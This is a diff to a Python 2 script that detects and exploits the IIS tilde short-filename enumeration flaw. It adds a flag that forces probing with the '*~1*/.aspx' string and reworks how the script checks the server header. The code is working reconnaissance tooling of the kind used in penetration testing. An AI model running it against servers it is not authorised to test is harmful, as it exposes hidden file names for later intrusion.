@@ -133,28 +133,38 @@ def searchFileForString(string, file):
 
 def checkForTildeVuln(url):
 	# Check if the server is IIS and vuln to tilde directory enumeration
-	# TODO - Need to make this more reliable than just relying on header responses
+	if args.f:
+		print bcolors.YELLOW + '[!]  You have used the -f switch to force us to try. Using the IIS/6 "*~1*/.aspx" string.' + bcolors.ENDC
+		check_string = '*~1*/.aspx'
+		return check_string
+
 	server_header = getWebServerResponse(url)
-	if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
-		print bcolors.GREEN + '[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'] + bcolors.ENDC
-		if '5.' in server_header.headers['server']:
-			check_string = '*~1*'
-		elif '6.' in server_header.headers['server']:
-			check_string = '*~1*/.aspx'
-		# TODO - Need to implement IIS7 check
+	if server_header.headers.has_key('server'):
+		if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
+			print bcolors.GREEN + '[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'] + bcolors.ENDC
+			if   '5.' in server_header.headers['server']:
+				check_string = '*~1*'
+			elif '6.' in server_header.headers['server']:
+				check_string = '*~1*/.aspx'
+		else:
+			print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
+			print 				'[!]     (Request error: %s)' % server_header.getcode()
+			print 				'[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
+			sys.exit()
 	else:
-		print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.\n[!]     (Request error: %s)\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
+		print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
+		print				'[!]     (Request error: %s)' % server_header.getcode()
+		print 				'[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
 		sys.exit()
 
 	# Check to see if the server is vulnerable to the tilde vulnerability
 	resp = getWebServerResponse(args.url + '/*~1*/.aspx')
+	print resp # debug
 	if resp.code == 404:
-		print bcolors.YELLOW + '[+]  The server is vulnerable to the tilde enumeration vulnerability.' + bcolors.ENDC
-		vuln = True
-	elif args.f:
-		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.\n[!]     But you have used the -f switch to force us to try.' + bcolors.ENDC
+		print bcolors.YELLOW + '[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..' + bcolors.ENDC
 	else:
-		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
+		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.'
+		print				'[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
 		sys.exit()
 
 	return check_string
@@ -475,10 +485,9 @@ def main():
 #=================================================
 
 # Command Line Arguments
-parser = argparse.ArgumentParser(description='Expands the file names found from the tilde enumeration vuln')
+parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
 # TODO - Implement the -b option
 parser.add_argument('-b', action='store_true', default=False, help='brute force backup extension, extensions')
-# TODO - Implement the -f option
 parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
 parser.add_argument('-u', dest='url', help='URL to scan')
 parser.add_argument('-v', action='store_true', default=False, help='verbose output')
